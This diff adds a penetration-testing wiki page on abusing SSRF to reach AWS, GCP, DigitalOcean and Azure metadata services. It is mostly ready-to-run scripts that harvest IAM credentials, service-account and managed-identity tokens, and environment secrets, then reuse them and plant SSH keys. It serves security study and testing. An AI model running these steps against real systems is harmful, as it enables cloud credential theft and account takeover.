@@ -1,0 +1,1089 @@
+# Cloud SSRF
+
+{{#include ../../banners/hacktricks-training.md}}
+
+## AWS
+
+### Abusing SSRF in AWS EC2 environment
+
+The **instance metadata** endpoint is accessible from an EC2 instance at `http://169.254.169.254` and exposes information about that instance ([metadata documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)).
+
+There are **2 versions** of the metadata endpoint. The **first** one allows to **access** the endpoint via **GET** requests (so any **SSRF can exploit it**). For the **version 2**, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), you need to ask for a **token** sending a **PUT** request with a **HTTP header** and then use that token to access the metadata with another HTTP header (so it's **more complicated to abuse** with a SSRF).
+
+> [!CAUTION]
+> Note that if the EC2 instance is enforcing IMDSv2, [**according to the docs**](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html), the **response of the PUT request** will have a **hop limit of 1**, making impossible to access the EC2 metadata from a container inside the EC2 instance.
+>
+> Moreover, **IMDSv2** will also **block requests to fetch a token that include the `X-Forwarded-For` header**. This is to prevent misconfigured reverse proxies from being able to access it.
+
+You can find information about the [metadata endpoints in the docs](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html). In the following script some interesting information is obtained from it:
+
+```bash
+EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
+HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
+URL="http://169.254.169.254/latest/meta-data"
+
+aws_req=""
+if [ "$(command -v curl)" ]; then
+    aws_req="curl -s -f -H '$HEADER'"
+elif [ "$(command -v wget)" ]; then
+    aws_req="wget -q -O - -H '$HEADER'"
+else
+    echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
+fi
+
+printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
+printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
+printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
+printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
+printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
+printf "region: "; eval $aws_req "$URL/placement/region"; echo ""
+
+echo ""
+echo "Account Info"
+eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
+eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""
+
+echo ""
+echo "Network Info"
+for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do
+  echo "Mac: $mac"
+  printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
+  printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
+  printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
+  echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
+  printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
+  echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
+  printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
+  echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
+  echo ""
+done
+
+echo ""
+echo "IAM Role"
+eval $aws_req "$URL/iam/info"
+for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do
+  echo "Role: $role"
+  eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
+  echo ""
+done
+
+echo ""
+echo "User Data"
+# Search hardcoded credentials
+eval $aws_req "http://169.254.169.254/latest/user-data"
+
+echo ""
+echo "EC2 Security Credentials"
+eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
+```
+
+As a **publicly available IAM credentials** exposed example you can visit: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)
+
+You can also check public **EC2 security credentials** in: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)
+
+You can then take **those credentials and use them with the AWS CLI**. This will allow you to do **anything that role has permissions** to do.
+
+To take advantage of the new credentials, you will need to create a new AWS profile like this one:
+
+```
+[profilename]
+aws_access_key_id = ASIA6GG71[...]
+aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT[...]
+aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
+```
+
+Notice the **aws_session_token**, this is indispensable for the profile to work.
+
+[**PACU**](https://github.com/RhinoSecurityLabs/pacu) can be used with the discovered credentials to find out your privileges and try to escalate privileges
+
+### SSRF in AWS ECS (Container Service) credentials
+
+**ECS**, is a logical group of EC2 instances on which you can run an application without having to scale your own cluster management infrastructure because ECS manages that for you. If you manage to compromise service running in **ECS**, the **metadata endpoints change**.
+
+If you access _**http://169.254.170.2/v2/credentials/\<GUID>**_ you will find the credentials of the ECS machine. But first you need to **find the \<GUID>**. To find the \<GUID> you need to read the **environ** variable **AWS_CONTAINER_CREDENTIALS_RELATIVE_URI** inside the machine.\
+You could be able to read it exploiting an **Path Traversal** to `file:///proc/self/environ`\
+The mentioned http address should give you the **AccessKey, SecretKey and token**.
+
+```bash
+curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
+```
+
+> [!TIP]
+> Note that in **some cases** you will be able to access the **EC2 metadata instance** from the container (check IMDSv2 TTL limitations mentioned previously). In these scenarios from the container you could access both the container IAM role and the EC2 IAM role.
+
+### SSRF in AWS EKS Pod Identity credentials
+
+Recent EKS clusters can use **Pod Identity** instead of the older ECS-style relative URI flow. In these pods, EKS injects:
+
+- `AWS_CONTAINER_CREDENTIALS_FULL_URI=http://169.254.170.23/v1/credentials`
+- `AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE=/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token`
+
+Therefore, a SSRF/LFI capable of reading **env vars** or the projected **service account token file** can often recover the pod IAM credentials by querying the local credential endpoint with the authorization token from that file:<sup>[[1]](#references)</sup>
+
+```bash
+# Common discovery primitives
+cat /proc/self/environ | tr '\\0' '\\n' | grep '^AWS_CONTAINER_'
+ls -l /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/
+
+# Use the projected token to query the local Pod Identity credential endpoint
+AUTH_HEADER=$(cat "$AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE")
+curl -s -H "Authorization: $AUTH_HEADER" "$AWS_CONTAINER_CREDENTIALS_FULL_URI"
+```
+
+This is especially useful in **EKS webhooks**, **templating services**, or **URL fetchers** that run inside pods and expose a SSRF plus a local file read primitive. The response contains temporary AWS credentials that can be reused from the AWS CLI or tooling such as **Pacu**.<sup>[[1]](#references)</sup>
+
+### SSRF for AWS Lambda
+
+In this case the **credentials are stored in env variables**. So, to access them you need to access something like **`file:///proc/self/environ`**.
+
+The **name** of the **interesting env variables** are:
+
+- `AWS_SESSION_TOKEN`
+- `AWS_SECRET_ACCESS_KEY`
+- `AWS_ACCESS_KEY_ID`
+
+Moreover, in addition to IAM credentials, Lambda functions also have **event data that is passed to the function when it is started**. This data is made available to the function via the [runtime interface](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) and could contain **sensitive** **information** (like inside the **stageVariables**). Unlike IAM credentials, this data is accessible over standard SSRF at **`http://localhost:9001/2018-06-01/runtime/invocation/next`**.
+
+> [!WARNING]
+> Note that **lambda credentials** are inside the **env variables**. So if the **stack trace** of the lambda code prints env vars, it's possible to **exfiltrate them provoking an error** in the app.
+
+### SSRF URL for AWS Elastic Beanstalk
+
+We retrieve the `accountId` and `region` from the API.
+
+```
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+```
+
+We then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.
+
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+```
+
+![Blurred AWS metadata credentials returned through an Elastic Beanstalk SSRF](https://miro.medium.com/max/60/0*4OG-tRUNhpBK96cL?q=20) ![AWS metadata credentials returned through an Elastic Beanstalk SSRF](https://miro.medium.com/max/1469/0*4OG-tRUNhpBK96cL)
+
+Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
+
+## GCP
+
+You can [**find here the docs about metadata endpoints**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata).
+
+### SSRF URL for Google Cloud
+
+Requires the HTTP header **`Metadata-Flavor: Google`** and you can access the metadata endpoint in with the following URLs:
+
+- [http://169.254.169.254](http://169.254.169.254)
+- [http://metadata.google.internal](http://metadata.google.internal)
+- [http://metadata](http://metadata)
+
+Interesting endpoints to extract information:
+
+```bash
+# /project
+# Project name and number
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
+# Project attributes
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true
+
+# /oslogin
+# users
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
+# groups
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
+# security-keys
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
+# authorize
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize
+
+# /instance
+# Description
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
+# Hostname
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
+# ID
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
+# Image
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
+# Machine Type
+curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
+# Name
+curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
+# Tags
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
+# Zone
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
+# User data
+curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
+# Network Interfaces
+for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
+    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
+    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
+    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
+    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
+    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
+    echo "  ==============  "
+done
+# Service Accounts
+for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
+    echo "  Name: $sa"
+    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
+    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
+    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
+    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
+    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
+    echo "  ==============  "
+done
+# K8s Attributtes
+## Cluster location
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
+## Cluster name
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
+## Os-login enabled
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
+## Kube-env
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
+## Kube-labels
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
+## Kubeconfig
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig
+
+# All custom project attributes
+curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
+    -H "Metadata-Flavor: Google"
+
+# All custom project attributes instance attributes
+curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
+    -H "Metadata-Flavor: Google"
+```
+
+Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)
+
+```
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+```
+
+> [!CAUTION]
+> In order to **use the exfiltrated service account token** you can just do:
+>
+> ```bash
+> # Via env vars
+> export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
+> gcloud projects list
+>
+> # Via setup
+> echo "<token>" > /some/path/to/token
+> gcloud config set auth/access_token_file /some/path/to/token
+> gcloud projects list
+> gcloud config unset auth/access_token_file
+> ```
+
+### Add an SSH key
+
+Extract the token
+
+```
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+```
+
+Check the scope of the token (with the previous output or running the following)
+
+```bash
+curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  {
+        "issued_to": "101302079XXXXX",
+        "audience": "10130207XXXXX",
+        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
+        "expires_in": 2443,
+        "access_type": "offline"
+}
+```
+
+Now push the SSH key.
+
+```bash
+curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
+-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
+-H "Content-Type: application/json"
+--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
+```
+
+### Cloud Functions
+
+The metadata endpoint works the same as in VMs but without some endpoints:
+
+```bash
+# /project
+# Project name and number
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
+
+# /instance
+# ID
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
+# Zone
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
+# Auto MTLS config
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/platform-security/auto-mtls-configuration
+# Service Accounts
+for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
+    echo "  Name: $sa"
+    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
+    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
+    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
+    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
+    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
+    echo "  ==============  "
+done
+```
+
+### Cloud Run / Cloud Functions 2nd gen
+
+For **Cloud Run** and **2nd generation Cloud Functions** it is usually more interesting to steal not only the OAuth access token, but also an **audience-bound identity token** from the metadata server. This is useful when the compromised workload can reach **private Cloud Run services**, **IAP-protected backends**, or any service validating Google-issued ID tokens.
+
+```bash
+# OAuth access token for the attached service account
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+
+# Audience-bound identity token
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://TARGET-REGION-PROJECT.run.app"
+```
+
+> [!TIP]
+> The **`identity`** endpoint requires an **`audience`** parameter. In real engagements this usually means that, after proving SSRF against `token`, you should enumerate internal service URLs and then request a second token with the exact audience expected by the target service.
+
+## Digital Ocean
+
+> [!WARNING]
+> There isn't things like AWS Roles or GCP service account, so don't expect to find metadata bot credentials
+
+Documentation available at [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)
+
+```
+curl http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
+curl http://169.254.169.254/metadata/v1.json | jq
+```
+
+## Azure
+
+### Azure VM
+
+[**Docs** in here](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).
+
+- **Must** contain the header `Metadata: true`
+- Must **not** contain an `X-Forwarded-For` header
+
+> [!TIP]
+> An Azure VM can have attached 1 system managed identity and several user managed identities. Which basically means that you can **impersonate all the managed identities attached to a VM**.
+>
+> When requesting an access token to the metadata endpoint, by default the metadata service will use the **system assigned managed identity** to generate the token, if there is any system assigned managed identity. In case there is only just **ONE user assigned managed identity**, then this will be used by default. However, in case there is no system assigned managed identity and there are **multiple user assigned managed identities**, then the metadata service will return an error indicating that there are multiple managed identities and it's necessary to **specify which one to use**.
+>
+> The most complete way to enumerate the **attached managed identities** is usually via **Azure WireServer / GoalState / ExtensionsConfig**, because that platform configuration can expose the **user assigned managed identities** attached to the VM (for more info check: <https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/vms/index.html>).
+>
+> <details>
+>
+> <summary>Example Linux script to enumerate attached managed identities from the VM</summary>
+>
+> ```bash
+> #!/usr/bin/env bash
+> set -euo pipefail
+>
+> ws="http://168.63.129.16"
+>
+> goal_xml="$(curl -fsS -H "x-ms-version: 2012-11-30" "$ws/?comp=goalstate")"
+>
+> ext_url="$(
+>   GOAL_XML="$goal_xml" python3 - <<'PY'
+> import os
+> import xml.etree.ElementTree as ET
+>
+> root = ET.fromstring(os.environ["GOAL_XML"].strip())
+>
+> def lname(tag):
+>     return tag.rsplit("}", 1)[-1]
+>
+> for el in root.iter():
+>     if lname(el.tag) == "ExtensionsConfig" and (el.text or "").strip():
+>         print(el.text.strip())
+>         break
+> PY
+> )"
+>
+> ext_xml="$(curl -fsS -H "x-ms-version: 2012-11-30" "$ext_url")"
+>
+> EXT_XML="$ext_xml" python3 - <<'PY'
+> import os
+> import xml.etree.ElementTree as ET
+>
+> root = ET.fromstring(os.environ["EXT_XML"].strip())
+>
+> def lname(tag):
+>     return tag.rsplit("}", 1)[-1]
+>
+> ids = [el for el in root.iter() if lname(el.tag) == "UserAssignedIdentity"]
+>
+> if not ids:
+>     print("No UserAssignedIdentity nodes found")
+>     raise SystemExit(0)
+>
+> for idnode in ids:
+>     client_id = ""
+>     object_id = ""
+>     resource_id = ""
+>
+>     for child in idnode.iter():
+>         name = lname(child.tag)
+>         text = (child.text or "").strip()
+>         if name == "IdentityClientId":
+>             client_id = text
+>         elif name == "IdentityObjectId":
+>             object_id = text
+>         elif name == "IdentityResourceId":
+>             resource_id = text
+>
+>     print("[+] Managed Identity:")
+>     print(f"    ClientId   : {client_id}")
+>     print(f"    ObjectId   : {object_id}")
+>     print(f"    ResourceId : {resource_id}")
+> PY
+> ```
+>
+> </details>
+
+
+> [!WARNING]
+> If WireServer / GoalState is not reachable from your execution context, the following are useful **alternative ways** to identify attached managed identities:
+>
+> - Get **attached identities with az cli** (if you have already compromised a principal in the Azure tenant with the permission `Microsoft.Compute/virtualMachines/read`)
+>
+> ```bash
+> az vm identity show \
+>  --resource-group <rsc-group> \
+>  --name <vm-name>
+> ```
+>
+> - Get **attached identities** using the default attached MI in the metadata:
+>
+> ```bash
+> export API_VERSION="2021-12-13"
+>
+> # Get token from default MI
+> export TOKEN=$(curl -s -H "Metadata:true" \
+>  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/" \
+>  | jq -r '.access_token')
+>
+> # Get needed details
+> export SUBSCRIPTION_ID=$(curl -s -H "Metadata:true" \
+>  "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.subscriptionId')
+> export RESOURCE_GROUP=$(curl -s -H "Metadata:true" \
+>  "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.resourceGroupName')
+> export VM_NAME=$(curl -s -H "Metadata:true" \
+>  "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.name')
+>
+> # Try to get attached MIs
+> curl -s -H "Authorization: Bearer $TOKEN" \
+>  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Compute/virtualMachines/$VM_NAME?api-version=$API_VERSION" | jq
+> ```
+>
+> - **Get all** the defined managed identities in the tenant and **brute force** to see if any of them is attached to the VM (the permission `Microsoft.ManagedIdentity/userAssignedIdentities/read` is needed):
+>
+> ```bash
+> az identity list
+> ```
+>
+
+> [!CAUTION]
+> For this VM metadata endpoint, select a user-assigned managed identity with `object_id`, `client_id`, or `msi_res_id`; omitting all three selects the default managed identity ([**docs**](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)).
+
+{{#tabs}}
+{{#tab name="Bash"}}
+
+```bash
+HEADER="Metadata:true"
+URL="http://169.254.169.254/metadata"
+API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions
+
+echo "Instance details"
+curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"
+
+echo "Load Balancer details"
+curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"
+
+echo "Management Token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"
+
+echo "Graph token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"
+
+echo "Vault token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"
+
+echo "Storage token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
+```
+
+{{#endtab}}
+
+{{#tab name="PS"}}
+
+```bash
+# Powershell
+Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
+## User data
+$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+
+## Get management token
+(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" -Headers @{"Metadata"="true"}).access_token
+
+## Get graph token
+(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://graph.microsoft.com/" -Headers @{"Metadata"="true"}).access_token
+
+## Get vault token
+(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net/" -Headers @{"Metadata"="true"}).access_token
+
+## Get storage token
+(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/" -Headers @{"Metadata"="true"}).access_token
+
+
+# More Paths
+/metadata/instance?api-version=2017-04-02
+/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+/metadata/instance/compute/userData?api-version=2021-01-01&format=text
+```
+
+{{#endtab}}
+{{#endtabs}}
+
+> [!WARNING]
+> Note that the endpoint **`http://169.254.169.254/metadata/v1/instanceinfo` doesn't require the `Metadata: True` header** which is great to show impact in SSRF vulnerabilities in Azure were you cannot add this header.
+
+### Azure WireServer & GoalState
+
+Azure VMs expose **internal platform endpoints** that are used for configuration, metadata retrieval and identity management. Understanding the difference between them is critical for **enumeration, privilege escalation and post-exploitation**.
+
+---
+
+#### Wire Server (Azure Fabric Endpoint)
+
+The **Azure WireServer** is an internal Azure IP (`168.63.129.16`) used by the platform to communicate with the VM.
+
+It is responsible for:
+
+- Communication with the **VM Agent**
+- Delivering:
+  - **GoalState**
+  - **ExtensionsConfig**
+  - Internal VM configuration (including identities)
+- DHCP & DNS services
+- Health monitoring
+
+---
+
+#### GoalState & ExtensionsConfig
+
+The **GoalState** represents the **desired configuration of the VM** as defined by Azure. It may include:
+
+- Extensions configuration
+- Managed identities
+- Provisioning state
+- Agent instructions
+
+The **ExtensionsConfig** contains detailed configuration of VM extensions and may include:
+
+- **User Assigned Managed Identities**
+- Extension settings
+- Secrets (depending on extension)
+
+These endpoints are typically accessed via:
+
+```bash
+curl -H "x-ms-version: 2012-11-30" http://168.63.129.16/?comp=goalstate
+```
+
+#### Access Restrictions
+
+Although the endpoint is reachable from the VM network, **it is not equally accessible from all contexts**.
+
+**Accessible from**:
+
+- Azure **VM Agent**
+- Azure **Run Command**
+- **VM Extensions**
+
+**Not reliably accessible from**:
+
+- Interactive SSH sessions (e.g., `azureuser`)
+- Unprivileged processes inside the VM
+
+This is because:
+
+- The WireServer is designed for **platform-agent communication**
+- Requests may require **specific headers, timing, or context**
+- Some responses are only available to the **VM Agent execution environment**
+
+---
+
+#### Run Command vs SSH Context
+
